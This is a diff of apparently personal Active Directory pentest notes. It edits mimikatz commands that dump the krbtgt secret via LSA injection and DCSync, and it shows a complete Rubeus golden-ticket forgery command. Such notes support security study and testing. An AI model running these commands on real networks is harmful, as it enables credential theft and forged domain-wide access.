@@ -382,7 +382,7 @@ Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofother
 ## from DC memory (LSA) 
 ./mimikatz "lsadump::lsa /inject /name:krbtgt"
 ## using dcsync 
-./mimikatz "lsadump::dcsync /domain:eagle.local /user:krbtgt"
+./mimikatz "privilege::debug" "lsadump::dcsync /domain:eagle.local /user:krbtgt"
 
 # powerview
 ## get domain sid
@@ -396,7 +396,8 @@ Rubeus.exe golden /aes256:6a8941dcb801e0bf63444b830e5faabec24b442118ec60def839fd
 ## use the info to forge a ticket
 ## /id is user(that we want to impersonate) rid
 ## /pgid is group user rid
-## /netbios is domain name 
+## /netbios is domain name
+## check the rest of params in https://github.com/GhostPack/Rubeus?tab=readme-ov-file#ticket-forgery
 Rubeus.exe golden /aes256:6A8941DCB801E0BF63444B830E5FAABEC24B442118EC60DEF839FD47A10AE3D5 /user:harmj0y /id:1106 /pgid:513 /domain:rubeus.ghostpack.local /sid:S-1-5-21-3237111427-1607930709-3979055039 /pwdlastset:"14/07/2021 02:07:12" /minpassage:1 /logoncount:16 /displayname:"Harm J0y" /netbios:RUBEUS /groups:513 /dc:PDC1.rubeus.ghostpack.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD,NOT_DELEGATED
 
 # mimikatz
